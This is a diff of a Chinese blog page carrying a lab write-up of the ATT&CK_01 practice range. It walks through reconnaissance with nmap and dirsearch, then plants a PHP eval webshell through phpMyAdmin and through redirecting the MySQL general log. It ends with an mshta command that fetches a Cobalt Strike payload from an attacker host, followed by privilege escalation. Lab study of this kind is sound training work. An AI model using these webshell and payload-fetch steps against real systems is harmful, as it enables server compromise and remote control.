@@ -36,38 +36,37 @@
   </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
 </head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">greetdawn&#039;s Site</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Greetdawn"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">标签</a></li><li class="is-active"><a href="#" aria-current="page">内网渗透</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-10-27T05:56:27.000Z" title="2021/10/27 下午1:56:27">2021-10-27</time>发表</span><span class="level-item"><time dateTime="2021-11-22T10:29:34.138Z" title="2021/11/22 下午6:29:34">2021-11-22</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a></span><span class="level-item">4 分钟读完 (大约666个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/10/27/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/ATT-CK-01/">ATT&amp;CK_01靶场学习</a></h1><div class="content"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>靶场环境部署时，<code>win7</code>虚机需要进入系统手动开启一下<code>phpstudy</code>，且关闭防火墙。</p>
 <h1 id="综合渗透"><a href="#综合渗透" class="headerlink" title="综合渗透"></a>综合渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看本机地址段，使用<code>netdiscover</code>发现同段存活主机</p>
-<pre class="language-none"><code class="language-none">netdiscover -i eth0 -r 192.168.49.0&#x2F;24</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.49.0/24</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027165007738.png" alt="image-20211027165007738"></p>
 <p>使用<code>nmap</code>扫描目前主机端口开放情况</p>
-<pre class="language-none"><code class="language-none">nmap -T4 -A -v -sS 192.168.49.129</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v -sS 192.168.49.129</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027165746145.png" alt="image-20211027165746145"></p>
 <p>站点目录扫描</p>
-<pre class="language-none"><code class="language-none">python3 dirsearch.py -u &quot;http:&#x2F;&#x2F;192.168.49.129&#x2F;&quot; -e php</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u &quot;http://192.168.49.129/&quot; -e php</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028110507409.png" alt="image-20211028110507409"></p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028134039225.png" alt="image-20211028134039225"></p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="phpmyadmin写日志getshell"><a href="#phpmyadmin写日志getshell" class="headerlink" title="phpmyadmin写日志getshell"></a>phpmyadmin写日志getshell</h3><p>web访问发现直接是<code>phpstudy</code>探针,通过探针测试出<code>mysql</code>存在弱口令<code>root/root</code></p>
 <p>因为<code>phpstudy</code>存在<code>phpmyadmin</code>组件，直接利用<code>phpmyadmin</code>实现写<code>webshell</code>操作</p>
-<pre class="language-none"><code class="language-none">select &#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39; into outfile &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;shell.php&#39;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27; into outfile &#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>但是开启了写文件限制</p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027172141356.png" alt="image-20211027172141356"></p>
 <p>但是这里可以尝试使用日志文件<code>getshell</code></p>
 <p>首先查看日志状态</p>
-<pre class="language-none"><code class="language-none">show variables  like  &#39;%general%&#39;; </code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  &#x27;%general%&#x27;; </span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027172342830.png" alt="image-20211027172342830"></p>
 <p>当开启<code>general</code>时，所执行的<code>sql</code>语句都会出现在<code>stu1.log</code>文件中。那么，如果修改<code>generallogfile</code>的值，那么所执行的<code>sql</code>语句就会对应生成对应的文件中，进而<code>getshell</code>。</p>
-<pre class="language-none"><code class="language-none">SET GLOBAL general_log&#x3D;&#39;on&#39;
-set GLOBAL general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;shell.php&#39;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log=&#x27;on&#x27;</span><br><span class="line">set GLOBAL general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>再次执行含有<code>shell</code>的语句，请求发现写入成功</p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027172655912.png" alt="image-20211027172655912"></p>
 <h3 id="后台弱口令getshell"><a href="#后台弱口令getshell" class="headerlink" title="后台弱口令getshell"></a>后台弱口令getshell</h3><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028140613746.png" alt="image-20211028140613746"></p>
 <p>根据备份站点文件获取完整路径信息</p>
-<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.49.129&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;hack.php</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.49.129/yxcms/protected/apps/default/view/default/hack.php</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028141427018.png" alt="image-20211028141427018"></p>
 <h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>前台注册用户留言板插入,后台审核通过即可触发。</p>
@@ -76,7 +75,7 @@ set GLOBAL general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;shell.php&#
 <h2 id="主机上线"><a href="#主机上线" class="headerlink" title="主机上线"></a>主机上线</h2><h3 id="cs主机上线提权"><a href="#cs主机上线提权" class="headerlink" title="cs主机上线提权"></a>cs主机上线提权</h3><p>使用蚁剑成功连接<code>shell</code></p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028103301810.png" alt="image-20211028103301810"></p>
 <p>使用<code>cs html</code>上线主机，且是<code>administrator</code>权限。</p>
-<pre class="language-none"><code class="language-none">mshta http:&#x2F;&#x2F;192.168.49.130:80&#x2F;download&#x2F;file.ext</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://192.168.49.130:80/download/file.ext</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028104449312.png" alt="image-20211028104449312"></p>
 <p>使用<code>cs</code>内建提权码，成功提至管理员权限</p>
